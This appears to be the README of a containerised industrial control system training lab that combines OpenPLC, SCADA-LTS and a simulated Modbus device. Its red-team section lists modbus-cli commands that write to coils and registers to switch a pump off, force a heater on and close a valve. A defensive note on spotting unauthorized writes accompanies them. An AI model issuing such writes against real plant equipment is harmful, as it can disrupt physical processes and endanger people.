# ICS-Docker-Dev: OpenPLC + SCADA-LTS + Modbus Slave Simulation

This project simulates a small **industrial control system (ICS)** stack for training and research:

- **SCADA-LTS** – the HMI layer (viewing sensor values, toggling controls).
- **OpenPLC** – the PLC runtime executing IEC 61131-3 Structured Text logic.
- **Python Modbus Slave** – simulated field devices (sensors and actuators).
- **MySQL** – backend database for SCADA-LTS.

The setup is containerized using Docker Compose and runs over a static bridged network.

---

## Architecture

```
+---------------------+       +-------------------+       +---------------------+
|     SCADA-LTS       | <---> |     OpenPLC       | <---> |   Python Modbus     |
| (HMI / Historian)   |       | (PLC Logic ST)    |       | (Slave Device Sim) |
+---------------------+       +-------------------+       +---------------------+
            \                         ^                           ^
             \                        |                           |
              +-----------------------+---------------------------+
                                MySQL Database
```

- **OpenPLC** connects to the Modbus slave over TCP (`192.25.0.9:5020`).
- The Modbus slave maintains holding registers and coils with realistic process data.
- SCADA-LTS polls OpenPLC for sensor values and provides operator controls.

---

## Register Map

| Register      | Type   | Purpose                      | PLC Variable   |
|---------------|--------|------------------------------|----------------|
| `%MW1000`     | Input  | Tank Level (cm)              | `Level_cm`     |
| `%MW1001`     | Input  | Inflow (l/s)                 | `Q_in_lps`     |
| `%MW1002`     | Input  | Outflow (l/s)                | `Q_out_lps`    |
| `%MW1003`     | Input  | Temperature (°C ×10)         | `Temp_C`       |
| `%MW1004`     | Input  | Pressure (kPa)               | `Pressure_kPa` |
| `%MW1005`     | Input  | Status Word                  | `StatusWord`   |
| `%M0`         | Coil   | Pump Command (0=Off,1=On)    | `PumpCmd`      |
| `%M1`         | Coil   | Heater Command (0=Off,1=On)  | `HeaterCmd`    |
| `%MW1100`     | Output | Inflow Setpoint              | `Inflow_SP`    |
| `%MW1101`     | Output | Valve Position (%)           | `ValvePct_SP`  |
| `%MW1102`     | Output | Temperature Setpoint (×10)   | `Temp_SP_x10`  |
| `%MW1103`     | Output | Noise Enable Flag            | `NoiseEnable`  |
| `%MW1104`     | Output | Fault Mask                   | `FaultMask`    |

---

## Running the Stack

1. Clone the repo and build:
   ```bash
   docker-compose up -d --build
   ```

2. Check services:
   - MySQL: `192.25.0.6`
   - SCADA-LTS UI: `http://localhost:8080`
   - OpenPLC runtime: `192.25.0.8`
   - Modbus Slave (Python): `192.25.0.9:5020`

3. Logs:
   ```bash
   docker logs -f slavedevice
   docker logs -f openplc
   docker logs -f scadalts
   ```

---

## SCADA-LTS Setup

- Add a **Modbus TCP data source** pointing to OpenPLC (`192.25.0.8:502`).
- Map coils `%M0`, `%M1` as settable **binary points** (Pump/Heater).
- Map registers `%MW1000..1005` as input sensors.
- Add `%MW1100..1104` as settable holding registers (setpoints).
- Build a **graphical view** with switches and gauges for interaction.

---

## Red Team Training Scenario

Attackers target weakly secured ICS networks where Modbus TCP is open.  
Here, you can simulate an attack against the PLC <-> device communication.

### Attack Goals
- Turn **Pump** OFF unexpectedly.
- Manipulate **Valve Position Setpoint** to 0%, disrupting flow.
- Force **Heater ON** without operator command.

---

## Attack Commands

Use [modbus-cli](https://github.com/hsanjuan/modbus-cli) for testing:

### Read 5 holding registers (1100–1104)
```bash
modbus read -p 5020 -s 1 --schneider 192.25.0.9 %MW1100 5
```

### Turn Pump OFF (coil 0 = %M0)
```bash
modbus write -p 5020 -s 1 --schneider 192.25.0.9 %M0 0
```

### Turn Heater ON (coil 1 = %M1)
```bash
modbus write -p 5020 -s 1 --schneider 192.25.0.9 %M1 1
```

### Close Valve (setpoint to 0%)
```bash
modbus write -p 5020 -s 1 --schneider 192.25.0.9 %MW1101 0
```

---

## Training Notes

- **Normal ops**: SCADA-LTS controls pump/heater, setpoints stay stable.  
- **During attack**: Modbus writes override operator values, showing unexpected behavior in HMI trends.  
- **Defensive exercise**: Monitor logs (`slavedevice`, `openplc`) to detect unauthorized writes.

---

## Next Steps

- Add IDS/IPS (e.g., Snort/Suricata) on the Docker network.  
- Extend the Python slave with more realistic physics (tank filling/draining).  
- Script blue team alerts when values change outside expected ranges.
